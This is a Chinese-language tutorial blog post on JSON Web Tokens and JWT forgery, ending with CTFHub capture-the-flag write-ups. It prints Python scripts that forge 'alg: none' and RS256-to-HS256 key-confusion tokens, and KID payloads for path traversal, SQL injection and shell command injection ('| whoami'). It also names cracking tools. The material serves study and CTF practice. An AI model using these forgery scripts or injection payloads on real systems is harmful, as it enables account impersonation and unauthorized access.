<p>以后，<strong>用户与服务端通信的时候，都要发回这个 JSON 对象</strong>。<em>服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</em></p>
<p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在<u>本地</u>（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
<p><strong><u>这样服务器就不保存任何 session 数据了</u>，也就是说，服务器变成无状态了，从而比较容易实现扩展</strong>。</p>
<p>特点:</p>
<ul>
<li>三部分组成，每一部分都进行字符串的转化</li>
<li><strong>解密的时候没有使用数据库，仅仅使用的是secret进行解密（减小服务器资源压力）</strong></li>
<li>Jwt使用的secret千万不能丢失</li>
</ul>
<h4 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h4><ol>
<li><strong>前端通过WEB表单将自己的用户名和密码发送到后端的接口</strong>。改过程一般是HTTP的post请求。建议的方式是通过SSL加密的传输(https协议)，从而避免敏感信息被嗅探。</li>
<li><u>后端核对用户名和密码成功后，将用户的id等其他信息作为JWT Payload(负载)，将其与头部分别进行Base64编码拼接后签名，形成一个JWT(Token)。</u></li>
<li><em>后端将IWT字符串作为登录成功的返回结果范围给前端。前段可以将返回的结果保存在localStorage（浏览器本地缓存）或sessionStorage（session缓存）上</em>，退出登录时前端删除保存的JWT。</li>
<li>前端在每次请求时将JWT放入HTTP的Header中的<strong>Authorization</strong>位。(解决XSS和XSRF问题）<br>后端检查是否存在，如存在验证JWT的有效性。例如，检查签名是否正确﹔检查Token是否过期;检查Token的接收方是否是自己(可选）</li>
<li>验证通过后后端使用JWT中包含的用户信息进行其他逻辑操作，返回相应结果</li>
</ol>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/v2-b034c3453cd2bb7177cfdbb4366a5e73_720w-1713610643655-1.webp" alt="img"></p>
<h6 id="token验证方法："><a href="#token验证方法：" class="headerlink" title="token验证方法："></a><strong>token验证方法：</strong></h6><p>验证流程:</p>
<ul>
<li>在头部信息中声明加密算法和常量，然后把header使用json转化为字符串</li>
<li>在载荷中声明用户信息，同时还有一些其他的内容，再次使用json把在和部分进行转化，转化为字符串</li>
<li>使用在header中声明的加密算法来进行加密，把第一部分字符串和第二部分的字符串结合和每个项目随机生成的secret字符串进行加密，生成新的字符串，此字符串是独一无二的</li>
<li><strong>解密的时候，只要客户端带着jwt来发起请求，服务端就直接使用secret进行解密，解签证解出第一部分和第二部分，然后比对第二部分的信息和客户端传过来的信息是否一致。如果一致验证成功，否则验证失败。</strong></li>
</ul>
<h3 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h3><p>JWT是一个stringt字符串，一般三部分组成，中间用<code>.</code>隔开。举个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>

<p>第一部分是头部(Header)，第二部分是有效载荷(Payload)，第三部分是签名(Signature)。</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>可以使用<a href="https://jwt.io/#encoded-jwt">在线工具</a>，进行JWT解密</p>
<h4 id="头部-Header"><a href="#头部-Header" class="headerlink" title="头部(Header)"></a>头部(Header)</h4><p>头部包含两部分信息:</p>
<ul>
<li>声明类型</li>
<li>声明加密的算法也就是签名算法。</li>
</ul>
<p>完整的头部如下JSON：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将头部进行base64加密，构成第一部分。</p>
<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></p>
<ul>
<li><p>alg属性表示token签名的算法(algorithm)，<strong>最常用的为HMAC和RSA算法</strong></p>
</li>
<li><p>typ属性表示这个token的类型（type）<strong>，JWT 令牌统一写为JWT。</strong></p>
</li>
</ul>
<p><strong><u>注意：</u>可以将JWT中的alg算法修改为none,JWT将算法设定为“None”。如果<code>alg</code>字段设为<code>None</code>，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问</strong></p>
<h4 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h4><p>包含3部分信息：</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>1.标准中注册的声明</strong></p>
<p><u>JWT规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</u></p>
<ul>
<li>iss(issuer): jwt签发者</li>
<li>sub(subject): jwt所面向的用户</li>
<li>aud(audience): 接收jwt的一方</li>
<li>exp(expiration time): jwt的过期时间，这个过期时间必须要大于签发时间</li>
<li>nbf(Not Before): 定义在什么时间之前，该jwt都是不可用的.</li>
<li>iat(Issued At): jwt的签发时间</li>
<li>jti(JWT ID): jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</li>
</ul>
<p><strong>2.公共的声明</strong></p>
<p>公共的声明可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表，一般添加用户的相关信息或其他业务需要的必须要信息。但不建议添加敏感信息，因为该部分在客户端可解密。</p>
<p><strong>3.私有的声明</strong></p>
<p>这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。 </p>
<p>如下定义一个payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class="line">  &quot;iat&quot;: 1451888119,</span><br><span class="line">  &quot;exp&quot;: 1454516119,</span><br><span class="line">  &quot;nbf&quot;: 1451888119,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再将其进行base64加密，得到JWT第二部分:<br><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</code></p>
<p><strong>注意：JWT默认是不对Payload加密的</strong>，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分。</p>
<h4 id="签证-Signature"><a href="#签证-Signature" class="headerlink" title="签证(Signature)"></a>签证(Signature)</h4><ul>
<li>base64加密后的header</li>
<li>base64加密后的payload</li>
<li>密钥secret</li>
</ul>
<p>签名是为了防止数据篡改。</p>
<p>这个部分需要base64加密后的header和Base64加密后的payload使用<code>.</code>连接组成的自妇产，然后通过header中声明的加密方式进行加盐组合加密，然后构成了jwt的第三部分。按照下面的公式产生签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// javascript</span><br><span class="line">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证</strong>，所以，它就是你服务端的<strong>私钥</strong>，只有服务器才知道，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。</p>
<p>算出签名以后，把Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>
<h3 id="通过JWT进行认证"><a href="#通过JWT进行认证" class="headerlink" title="通过JWT进行认证"></a>通过JWT进行认证</h3><p><strong>客户端接收服务器返回的JWT，将其存储在Cookie或localStorage中</strong>。此后，<strong>客户端将在与服务器交互中都会带JWT</strong>。<em>如果将它存储在Cookie中，就可以自动发送，但是不会跨域</em>，<strong>因此一般是将它放入HTTP请求的Header Authorization字段中</strong>。<em>当跨域时，也可以将JWT被放置于POST请求的数据主体中。</em></p>
<p>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>
<p>一般是在请求头里加入Authorization，并加上Bearer标注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>服务端会验证token，如果验证通过就会返回相应的资源。</p>
<h2 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h2><p>参考文章:</p>
<p><code>https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9</code></p>
<p><code>https://cloud.tencent.com/developer/article/1552824</code></p>
<p><strong>JWT的安全问题一般有以下几种:</strong></p>
<ul>
<li>修改算法为none</li>
<li>修改算法从RS256到HS256</li>
<li>密钥泄露导致信息泄露</li>
<li>爆破密钥</li>
</ul>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h5><p>这里有几种读数据的方法</p>
<p><strong>Linux</strong> <strong>base64工具（带有-d标志用于解码）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>浏览器JavaScript控制台：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;&gt; <span class="title function_">atob</span>(<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;</span>)</span><br><span class="line"> <span class="string">&quot;&#123;&quot;</span>typ<span class="string">&quot;:&quot;</span><span class="variable constant_">JWT</span><span class="string">&quot;,&quot;</span>alg<span class="string">&quot;:&quot;</span><span class="title class_">HS256</span><span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Powershell:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Pyhton:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(base64.b64decode(<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#x27;</span>))</span><br><span class="line">&#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h5 id="将算法改为none"><a href="#将算法改为none" class="headerlink" title="将算法改为none"></a>将算法改为none</h5><p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。</strong></p>
<p>设定该功能的最初目的是为了方便调试。但是，如果<strong>在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了</strong>，<u>若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</u>，所以，使用这个方法的前提是有这个功能。</p>
<p><strong>注意:<a href="https://jwt.io/#encoded-jwt">jwt.io</a>网站不能直接修改算法为none</strong>，会被认为是恶意行为，因此无法使用在线工具生成JWT，可以用python脚本生成:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1667822180,</span><br><span class="line">    &quot;exp&quot;: 1667829380,</span><br><span class="line">    &quot;nbf&quot;: 1667822180,</span><br><span class="line">    &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;jti&quot;: &quot;237410127e2551647730b97941cdcae5&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    &quot;&quot;, # 密钥，此处置为空</span><br><span class="line">    algorithm=&quot;none&quot;, # 加密方式</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">//注意：使用脚本只会生成两段字符串，虽然签名字符串为空，但是那个连接的点是必要的，可以看看下面ctfhub的例子</span><br></pre></td></tr></table></figure>

<p>应该还可以使用<strong>jwt_tool工具</strong>来改</p>
<p>将生成的字符串再上传，如果页面返回有效，那么说明存在漏洞。</p>
<h5 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h5><h6 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h6><p><strong>JWT最常用的两种算法是HMAC和RSA</strong>。HMAC（对称加密算法）用同一个密钥对token进行签名和认证（加密和解密）。而RSA（非对称加密算法）需要两个密钥，<strong>加密方用私钥加密，并把公钥告诉解密方用于解密</strong>。</p>
<p>再详细一些的两种加密格式上的区别:</p>
<ul>
<li>HMAC加密(对称加密)：正如上方生成签名那里一样，所以HS256加密后的字符串格式就是前面最开始那个例子。</li>
<li>RSA加密(非对称加密)：更多的使用在签名的场景，也就是确认信息的发送者。<strong>通过私钥加密，发送到对端，对端通过公钥解密。</strong>格式主要区别在于第三部分内容有所不同，代码如下:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSASHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  </span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的公钥</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">,</span><br><span class="line">  </span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的私钥</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>认证服务放私钥进行签名，其他服务校验的时候，通过公钥验签。</p>
<p>参考:<code>https://www.xiaoyeshiyu.com/post/191e.html</code></p>
<p>——————</p>
<h6 id="如何利用："><a href="#如何利用：" class="headerlink" title="如何利用："></a>如何利用：</h6><p>结合两种密钥的描述，在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p><strong>如果使用的是RS256算法加密，此时可以将算法RS256修改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）来攻击</strong>，过程如下：</p>
<p>在同时使用者两种算法时，如果本来传给客户端的JWT加密方式为RS256，<strong>这时将算法RS256改为HS256,后端代码会使用公钥作为秘密密钥，然后使用HS2562算法验证签名</strong>。<u>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到</u>，攻击者就可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名</p>
<p><strong>防御方法</strong>就是不要同时使用两种算法</p>
<p>简单生Jwt的脚本()：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span></span><br><span class="line"><span class="string">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span></span><br><span class="line"><span class="string">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span></span><br><span class="line"><span class="string">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span></span><br><span class="line"><span class="string">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span></span><br><span class="line"><span class="string">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span></span><br><span class="line"><span class="string">pwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br></pre></td></tr></table></figure>

<p>利用例题参考:</p>
<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin</code></p>
<p><code>https://eyesofgods.github.io/2019/05/22/iscc2019-web-wp/</code></p>
<h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5><p>当用户端提交请求给应用程序，服务端<strong>可能</strong>没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。</p>
<p>比如：</p>
<p>一个很好的例子是网站上的“个人资料”页面，因为我们只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。</p>
<p>此时就可以将代表身份声明改为admin，将重新生成的Token发给服务端效验，如访问页面正常，则说明漏洞存在。</p>
<h5 id="暴力破解密钥-工具"><a href="#暴力破解密钥-工具" class="headerlink" title="暴力破解密钥(工具)"></a>暴力破解密钥(工具)</h5><p><strong>爆破前提:</strong></p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已知的token</li>
<li>签名用的密钥不复杂(弱密钥)</li>
</ul>
<p><em>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证</em>。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p>
<p>因此，<strong>HMAC JWT破解是离线的</strong>，通过JWT破解工具可以爆破得到密钥。</p>
<p>很多工具都可以爆破，如**<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>(使用这个工具需要有字典)或者<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>等工具都可以**。爆破出密钥后就可以直接在jwt.io在线工具伪造任意用户的token。</p>
<p><strong>但是在kali上要使用工具时要在py文件目录下使用。</strong></p>
<h5 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h5><p>假设无法暴力破解密钥，那么可能通过其他途径获取密码，如git信息泄露、目录遍历，任意文件读取、XXE漏洞等，从而伪造任意token签名。</p>
<h5 id="操纵KID"><a href="#操纵KID" class="headerlink" title="操纵KID"></a>操纵KID</h5><p>KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。</p>
<h6 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h6><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../public/css/main.css&quot;</span>   <span class="comment">//使用公共文件main.css验证token</span></span><br></pre></td></tr></table></figure>

<p>例如，攻击者可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。</p>
<h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h6><p><strong>KID也可以用于在数据库中检索密钥</strong>。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。</p>
<p>如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>:<span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span>  <span class="comment">//使用字符串&quot;key&quot;验证token</span></span><br></pre></td></tr></table></figure>

<p>上面这个注入会导致应用程序返回字符串必然为“ key”（因为数据库中不存在名为“ aaaaaaa”的密钥）。<strong>然后使用字符串“ key”作为密钥来认证token。</strong></p>
<p><strong>类似逻辑后端为：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select * from table where kid=$kid&quot;</span><br></pre></td></tr></table></figure>

<p>如此我们就可以使用如上语句来使得查询出来的key作为密钥</p>
<p>参考<code>:https://zhuanlan.zhihu.com/p/37305980</code></p>
<p>同样在HITB 2017中也存在一道，<a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">参考</a></p>
<h6 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h6><p>有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。</p>
<p>一些函数就能给此类型攻击可乘之机，<strong>比如Ruby open（）</strong>。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;key_file&quot;</span> | whoami;</span><br></pre></td></tr></table></figure>

<p>类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似system（），exec（）的函数时，都会产生此种漏洞。</p>
<h5 id="操纵头部参数"><a href="#操纵头部参数" class="headerlink" title="操纵头部参数"></a>操纵头部参数</h5><p>参考这个板块下的第二个文章，遇到搜</p>
<h4 id="相关题目wp"><a href="#相关题目wp" class="headerlink" title="相关题目wp"></a>相关题目wp</h4><h5 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h5><h6 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h6><p>题目描述:JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}</p>
<p>————</p>
<p>打开即是一个登录页面，随便登录**(第一次登录没有token)**显示<code>where is flag</code>，抓包看看，在请求包得到一个jwt字符串，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJBRyI6IjI1NGEwYzcyNzY2YWM4N30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJGTCI6ImN0Zmh1Yns2YTAwYTMxMzAifQ.uPFtXGkmPcxJiivPldw_Ek93HwLeem9VDO1vwJZO0HY</span><br></pre></td></tr></table></figure>

<p>拿去解码得到</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420162816882.png" alt="image-20240420162816882"></p>
<p>最终flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6a00a3130254a0c72766ac87&#125;</span><br></pre></td></tr></table></figure>



<h6 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h6><p>题目描述：</p>
<p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p>
<p>————</p>
<p>打开后还是登录，登录成功后可以看到<code>Hello 1(guest), only admin can get flag.</code>,应该就是要伪造admin，抓包看看，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.2Y5_56UX1H_28WxpkOq3eZ6AB-JeyLH-mXwimgwhew8</span><br></pre></td></tr></table></figure>

<p>拿去解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将role改为admin</p>
<p>结合题目描述直接使用脚本签名为none的jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure>

<p>再次<strong>在当前目录(index.php)发包</strong>，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420164328912.png" alt="image-20240420164328912"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;158cb73238f8b1378e1a6fe8&#125;</span><br></pre></td></tr></table></figure>

